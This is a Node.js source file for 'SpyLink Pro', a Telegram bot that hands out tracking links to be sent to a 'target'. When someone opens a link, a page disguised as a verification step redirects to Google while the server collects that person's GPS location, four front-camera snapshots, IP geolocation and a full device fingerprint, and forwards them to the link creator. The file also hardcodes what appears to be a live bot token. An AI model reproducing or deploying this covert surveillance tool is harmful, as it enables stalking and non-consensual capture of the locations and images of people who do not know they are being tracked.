const express = require("express");
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');
const UAParser = require('ua-parser-js');

// 🔐 CONFIGURATION
const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
const ADMIN_USERNAME = "@aadi_io"; // Auto-detect admin by username
const HOST_URL = "https://botu-s3f9.onrender.com";

// 🌐 STATE MANAGEMENT
let maintenanceMode = false;
let sessions = {};
let users = new Set();

// 🚀 INITIALIZE EXPRESS APP
const app = express();
app.use(require('helmet')({ contentSecurityPolicy: false }));
app.use(require('cors')());
app.use(require('morgan')('dev'));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.set("view engine", "ejs");
app.use(express.static("public"));

// 🤖 TELEGRAM BOT INITIALIZATION
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.deleteWebHook().then(() => {
    console.log("✅ Premium SpyLink Bot Activated");
});

bot.on("polling_error", (error) => {
    if (!error.message.includes("409")) {
        console.error(`⚠️ Bot Error: ${error.message}`);
    }
});

// ==================== 🛡️ AUTO-ADMIN DETECTION & ACCESS CONTROL ====================

async function isAdmin(msg) {
    try {
        const chatMember = await bot.getChatMember(msg.chat.id, msg.from.id);
        // Check if user is admin OR matches admin username
        return chatMember.status === 'administrator' || 
               chatMember.status === 'creator' ||
               msg.from.username === ADMIN_USERNAME.replace('@', '');
    } catch (e) {
        return false;
    }
}

function checkAccess(msg) {
    if (maintenanceMode && !isAdmin(msg)) {
        bot.sendMessage(msg.chat.id, `
⛔ *SERVICE TEMPORARILY UNAVAILABLE*

The bot may be in maintenance or stopped by admin ${ADMIN_USERNAME}.

Please try again later.
        `, { parse_mode: "Markdown" });
        return false;
    }
    return true;
}

// ==================== ✨ PREMIUM BOT INTERFACE ====================

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name;
    const isUserAdmin = await isAdmin(msg);
    
    users.add(String(chatId));

    // Premium Welcome Animation
    await bot.sendMessage(chatId, "🌐 *Initializing Secure Connection...*", { parse_mode: "Markdown" });
    await new Promise(r => setTimeout(r, 1000));
    
    let welcomeMessage = `
🔐 *SpyLink Pro — Premium Intelligence Suite*

👋 Welcome, *${firstName}*!

${maintenanceMode ? '🔴 *SYSTEM STATUS: Maintenance Mode*' : '🟢 *SYSTEM STATUS: Active & Monitoring*'}

📊 *Capabilities:*
• Real-time GPS Tracking
• Full Device Fingerprinting
• Front Camera Snapshots (x4)
• Network, Battery, Sensor Data
• Permission & Storage Analysis

👇 *Select an option below:*
    `;

    const keyboard = {
        inline_keyboard: [
            [{ text: "🚀 Generate Tracking Link", callback_data: "create" }],
            [{ text: "📈 System Status", callback_data: "status" }]
        ]
    };

    // Auto-add Admin Panel for admins only
    if (isUserAdmin) {
        keyboard.inline_keyboard.push([{ text: "👑 Admin Control Panel", callback_data: "admin_panel" }]);
    }

    bot.sendMessage(chatId, welcomeMessage, {
        parse_mode: "Markdown",
        reply_markup: keyboard
    });
});

// ==================== 👑 ADMIN COMMANDS (/on, /off, /broadcast) ====================

bot.onText(/\/on/, async (msg) => {
    if (!(await isAdmin(msg))) return;
    
    maintenanceMode = false;
    await bot.sendMessage(msg.chat.id, "🔄 *Activating Service for All Users...*", { parse_mode: "Markdown" });
    await new Promise(r => setTimeout(r, 1500));
    bot.sendMessage(msg.chat.id, "🟢 *Service Successfully Activated!*\nAll users can now generate tracking links.", { parse_mode: "Markdown" });
});

bot.onText(/\/off/, async (msg) => {
    if (!(await isAdmin(msg))) return;
    
    maintenanceMode = true;
    await bot.sendMessage(msg.chat.id, "🔄 *Deactivating Service for Users...*", { parse_mode: "Markdown" });
    await new Promise(r => setTimeout(r, 1500));
    bot.sendMessage(msg.chat.id, `🔴 *Service Deactivated for Users*\nBot remains active in backend.\nUsers will see maintenance message.\nOnly admins can reactivate using /on`, { parse_mode: "Markdown" });
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if (!(await isAdmin(msg))) return;
    
    const broadcastMessage = match[1];
    let successCount = 0;
    let failCount = 0;
    
    await bot.sendMessage(msg.chat.id, "📣 *Initiating Broadcast to All Users...*", { parse_mode: "Markdown" });
    
    for (let userId of users) {
        try {
            await bot.sendMessage(userId, broadcastMessage, { parse_mode: "HTML" });
            successCount++;
        } catch (error) {
            failCount++;
        }
        await new Promise(r => setTimeout(r, 50)); // Rate limiting
    }
    
    bot.sendMessage(msg.chat.id, `
✅ *Broadcast Completed*

📬 Messages Delivered: ${successCount}
❌ Delivery Failed: ${failCount}
👥 Total Recipients: ${users.size}
    `, { parse_mode: "Markdown" });
});

// ==================== 🎛️ CALLBACK QUERY HANDLER (BUTTONS) ====================

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    
    if (!checkAccess({ chatId: chatId, from: { id: chatId } })) return;

    await bot.answerCallbackQuery(query.id);

    if (data === "create") {
        await bot.sendMessage(chatId, "⏳ *Generating Secure Session...*", { parse_mode: "Markdown" });
        await new Promise(r => setTimeout(r, 1200));
        
        const sessionId = uuidv4();
        sessions[sessionId] = { chatId, createdAt: new Date() };
        
        const targetUrl = Buffer.from("https://google.com").toString('base64');
        const trackingLink = `${HOST_URL}/verify/${sessionId}/${targetUrl}`;
        
        bot.sendMessage(chatId, `
🔐 *SECURE TRACKING SESSION CREATED*

🆔 *Session ID:* \`${sessionId}\`
🌐 *Target URL:* \`https://google.com\`

🔗 *Your Tracking Link:*
${trackingLink}

📱 *Instructions:*
1. Send this link to your target
2. When opened on their device:
   → GPS location captured
   → 4 front camera snapshots taken
   → Full device fingerprint collected
   → Comprehensive report sent here

⏱️ *Data collection takes <15 seconds*

👇 *Options:*
        `, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🆕 Create Another Link", callback_data: "create" }],
                    [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
                ]
            }
        });
    }

    if (data === "status") {
        await bot.answerCallbackQuery(query.id, { text: "Fetching System Metrics..." });
        
        const systemStatus = `
📊 *PREMIUM SYSTEM STATUS*

🟢 *Core Services:* Online
${maintenanceMode ? '🔴 *User Access:* Disabled (Maintenance)' : '🟢 *User Access:* Enabled'}
⏱️ *Uptime:* ${Math.floor(process.uptime())} seconds
💾 *Memory Usage:* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
👥 *Total Users:* ${users.size}
📁 *Active Sessions:* ${Object.keys(sessions).length}

*Last updated: ${new Date().toLocaleTimeString()}*
        `;
        
        bot.sendMessage(chatId, systemStatus, { parse_mode: "Markdown" });
    }

    if (data === "admin_panel") {
        if (!(await isAdmin({ chat: { id: chatId }, from: { id: chatId } }))) return;
        
        const adminPanel = `
👑 *ADMIN CONTROL PANEL*

🛠️ *System Commands:*
→ /on - Activate service for all users
→ /off - Deactivate service for users (maintenance)
→ /broadcast [message] - Send message to all users

📊 *Monitoring Commands:*
→ /stats - Detailed server statistics
→ /sessions - View active sessions
→ /clear - Clear all sessions

🔒 *Bot remains active in backend even when deactivated for users.*
        `;
        
        bot.sendMessage(chatId, adminPanel, { parse_mode: "Markdown" });
    }

    if (data === "main_menu") {
        bot.sendMessage(chatId, "🏠 *Returning to Main Menu...*", { parse_mode: "Markdown" });
        setTimeout(() => {
            bot.sendMessage(chatId, `
🔐 *SpyLink Pro — Premium Intelligence Suite*

👇 *Select an option:*
            `, {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "🚀 Generate Tracking Link", callback_data: "create" }],
                        [{ text: "📈 System Status", callback_data: "status" }],
                        [{ text: "👑 Admin Panel", callback_data: "admin_panel" }]
                    ].filter(button => !(button[0].text === "👑 Admin Panel") || isAdmin({ chat: { id: chatId }, from: { id: chatId } }))
                }
            });
        }, 1000);
    }
});

// ==================== 📊 ADMIN STATISTICS COMMANDS ====================

bot.onText(/\/stats/, async (msg) => {
    if (!(await isAdmin(msg))) return;
    
    const memory = process.memoryUsage();
    const statsMessage = `
📈 *DETAILED ADMIN STATISTICS*

🖥️ *System Resources:*
→ Memory Usage: ${(memory.heapUsed / 1024 / 1024).toFixed(2)} MB
→ External Memory: ${(memory.external / 1024 / 1024).toFixed(2)} MB
→ Total Memory: ${(memory.heapTotal / 1024 / 1024).toFixed(2)} MB

⏱️ *Performance Metrics:*
→ Uptime: ${Math.floor(process.uptime())} seconds
→ Node Version: ${process.version}
→ Platform: ${process.platform}

👥 *User Analytics:*
→ Total Users: ${users.size}
→ Active Sessions: ${Object.keys(sessions).length}
→ Unique Targets: ${new Set(Object.values(sessions).map(s => s.chatId)).size}

📅 *Server Started:* ${new Date(Date.now() - process.uptime() * 1000).toLocaleString()}
    `;
    
    bot.sendMessage(msg.chat.id, statsMessage, { parse_mode: "Markdown" });
});

bot.onText(/\/sessions/, async (msg) => {
    if (!(await isAdmin(msg))) return;
    
    if (Object.keys(sessions).length === 0) {
        return bot.sendMessage(msg.chat.id, "📭 *No active sessions found.*", { parse_mode: "Markdown" });
    }
    
    let sessionsList = "*📋 ACTIVE SESSIONS*\n\n";
    let count = 0;
    
    for (let [sessionId, sessionData] of Object.entries(sessions)) {
        if (count >= 10) break; // Limit to 10 for readability
        
        sessionsList += `🔐 *Session ${count + 1}:*\n`;
        sessionsList += `→ ID: \`${sessionId.substring(0, 8)}...\`\n`;
        sessionsList += `→ User: \`${sessionData.chatId}\`\n`;
        sessionsList += `→ Created: ${new Date(sessionData.createdAt).toLocaleTimeString()}\n`;
        sessionsList += `→ Age: ${Math.floor((Date.now() - sessionData.createdAt) / 1000)} seconds\n`;
        sessionsList += `---\n\n`;
        count++;
    }
    
    if (Object.keys(sessions).length > 10) {
        sessionsList += `ℹ️ *Showing first 10 of ${Object.keys(sessions).length} sessions.*\n`;
    }
    
    bot.sendMessage(msg.chat.id, sessionsList, { parse_mode: "Markdown" });
});

bot.onText(/\/clear/, async (msg) => {
    if (!(await isAdmin(msg))) return;
    
    const sessionCount = Object.keys(sessions).length;
    sessions = {};
    
    await bot.sendMessage(msg.chat.id, "🧹 *Clearing All Active Sessions...*", { parse_mode: "Markdown" });
    await new Promise(r => setTimeout(r, 1500));
    
    bot.sendMessage(msg.chat.id, `✅ *Successfully Cleared ${sessionCount} Sessions*\nAll tracking sessions have been terminated.`, { parse_mode: "Markdown" });
});

// ==================== 🌐 WEB ROUTES ====================

app.get("/", (req, res) => {
    res.send(`
    <html>
        <head><title>SpyLink Pro</title></head>
        <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
            <h1 style="color: #4CAF50;">🟢 SpyLink Pro Server</h1>
            <p>Premium Intelligence Suite - Operational</p>
            <p>Render Deployment: Active</p>
        </body>
    </html>
    `);
});

app.get("/verify/:id/:url", (req, res) => {
    const { id, url } = req.params;
    if (!sessions[id]) sessions[id] = { chatId: null };
    
    let finalUrl = "https://google.com";
    try { 
        finalUrl = Buffer.from(url, 'base64').toString('utf-8'); 
    } catch(e) {}
    
    res.render("diagnostics", { uid: id, url: finalUrl, host: HOST_URL });
});

// 📝 REPORT RECEIVER (Enhanced Data Processing)
app.post("/report", async (req, res) => {
    const { uid, data } = req.body;
    if (!sessions[uid]) return res.json({ error: "No session" });

    const chatId = sessions[uid].chatId;
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
    const ua = new UAParser(data.userAgent);

    // IP Geolocation
    let geo = { isp: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", mobile: false, proxy: false, org: "Unknown" };
    try {
        const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,mobile,proxy,lat,lon`);
        if(r.data.status === 'success') geo = r.data;
    } catch(e) { console.error("IP Geolocation failed:", e.message); }

    // Build Premium Report
    let report = `
🕵️‍♂️ *PREMIUM INTELLIGENCE REPORT*

🔖 *SESSION INFO*
• Session ID: \`${uid}\`
• Captured At: ${new Date().toLocaleString()}
• Victim IP: \`${ip}\`
• Google Maps: https://www.google.com/maps?q=${geo.lat},${geo.lon}

🌐 *NETWORK & LOCATION*
• Country: ${geo.country} | Region: ${geo.regionName} | City: ${geo.city}
• ISP: ${geo.isp} (${geo.org})
• Connection: ${data.network?.effectiveType || 'Unknown'} (${data.network?.downlink || 0} Mbps)
• RTT: ${data.network?.rtt || 'Unknown'}ms
• Mobile Data: ${geo.mobile ? '✅ Yes' : '❌ No'} | VPN/Proxy: ${geo.proxy ? '⚠️ Yes' : '✅ No'}

💻 *DEVICE & BROWSER*
• OS: ${ua.getOS().name} ${ua.getOS().version}
• Browser: ${ua.getBrowser().name} ${ua.getBrowser().version}
• Device: ${ua.getDevice().model || ua.getDevice().type || 'Unknown'}
• CPU Cores: ${data.hardware?.concurrency || 'Unknown'}
• RAM: ${data.hardware?.memory || 'Unknown'} GB
• Do Not Track: ${data.privacy?.doNotTrack ? '✅ On' : '❌ Off'}
• Cookies Enabled: ${data.privacy?.cookieEnabled ? '✅ Yes' : '❌ No'}

🖥️ *DISPLAY & MEDIA*
• Screen: ${data.screen?.width || 'Unknown'} x ${data.screen?.height || 'Unknown'} (${data.screen?.colorDepth || 'Unknown'}-bit)
• Orientation: ${data.screen?.orientation || 'Unknown'}
• WebGL Vendor: ${data.graphics?.webglVendor || 'Unknown'}
• WebGL Renderer: ${data.graphics?.webglRenderer || 'Unknown'}

🔋 *POWER & SENSORS*
• Battery Level: ${data.battery?.level !== undefined ? `${Math.round(data.battery.level * 100)}%` : 'Unknown'}
• Charging: ${data.battery?.charging !== undefined ? (data.battery.charging ? '🔌 Yes' : '🔋 No') : 'Unknown'}

🔐 *PERMISSIONS & SECURITY*
• Geolocation: ${data.permissions?.geolocation || 'Unknown'}
• Camera: ${data.permissions?.camera || 'Unknown'}
• Microphone: ${data.permissions?.microphone || 'Unknown'}

📅 *SYSTEM TIME & LOCALE*
• Local Time: ${data.locale?.time || 'Unknown'}
• Timezone: ${data.locale?.timezone || 'Unknown'}

📡 *ADDITIONAL METRICS*
• PDF Viewer: ${data.features?.pdfViewer ? '✅ Supported' : '❌ Not supported'}
• Storage Quota: ${data.storage?.quota ? `${(data.storage.quota / 1024 / 1024).toFixed(2)} MB` : 'Unknown'}

_📸 Waiting for Camera & GPS data..._
    `;

    bot.sendMessage(chatId, report, { parse_mode: "Markdown" });
    res.json({ status: "ok" });
});

// 📸 CAMERA RECEIVER
app.post("/cam", (req, res) => {
    const { uid, img, index } = req.body;
    if (sessions[uid] && img) {
        const buff = Buffer.from(img.replace(/^data:image\/png;base64,/, ""), 'base64');
        bot.sendPhoto(sessions[uid].chatId, buff, { 
            caption: `📸 *Camera Snapshot #${index || 1}*\nSession: \`${uid}\`\nCaptured at: ${new Date().toLocaleTimeString()}` 
        }, { filename: `snapshot_${index || 1}.png`, contentType: 'image/png' });
    }
    res.json({ status: "ok" });
});

// 📍 GPS RECEIVER
app.post("/location", (req, res) => {
    const { uid, lat, lon, acc, alt, speed, heading } = req.body;
    if (sessions[uid]) {
        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        let locationMsg = `📍 *PRECISE GPS LOCATION LOCKED*\n\n`;
        locationMsg += `• Latitude: \`${lat}\`\n`;
        locationMsg += `• Longitude: \`${lon}\`\n`;
        locationMsg += `• Accuracy: \`${acc} meters\`\n`;
        if (alt) locationMsg += `• Altitude: \`${alt} meters\`\n`;
        if (speed) locationMsg += `• Speed: \`${speed} m/s\`\n`;
        if (heading) locationMsg += `• Heading: \`${heading}°\`\n`;
        locationMsg += `🔗 [View on Google Maps](${mapLink})`;

        bot.sendMessage(sessions[uid].chatId, locationMsg, { parse_mode: "Markdown" });
        bot.sendLocation(sessions[uid].chatId, parseFloat(lat), parseFloat(lon));
    }
    res.json({ status: "ok" });
});

// Keep-Alive for Render
app.get("/keepalive", (req, res) => res.sendStatus(200));
setInterval(() => axios.get(`${HOST_URL}/keepalive`).catch(() => {}), 45000);

// START SERVER
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`✅ Premium SpyLink Pro Server v1.0`);
    console.log(`🔗 Running on port ${PORT}`);
    console.log(`🌐 Host: ${HOST_URL}`);
    console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 12)}...`);
});
